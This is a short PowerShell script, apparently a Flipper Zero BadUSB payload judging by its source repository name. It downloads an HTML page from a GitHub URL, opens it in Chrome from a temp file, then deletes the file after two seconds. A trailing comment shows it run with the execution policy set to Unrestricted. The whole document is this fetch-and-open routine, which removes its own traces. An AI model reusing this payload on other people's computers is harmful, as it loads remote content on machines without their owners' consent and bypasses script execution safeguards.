# Download the HTML code from the URL
$html = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itsweekly/FlipperZero-Bad-Polar/main/Proxy/index.html" -UseBasicParsing

# Save the HTML code to a temporary file
$tempFile = [IO.Path]::GetTempFileName() + ".html"
[IO.File]::WriteAllText($tempFile, $html.Content)

# Open the temporary file in Google Chrome
Start-Process "chrome.exe" $tempFile

# Wait for 2 seconds
Start-Sleep -Seconds 2

# Delete the temporary file
Remove-Item $tempFile

# powershell C:\Users\michael\Downloads\Sand.ps1 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Verbose
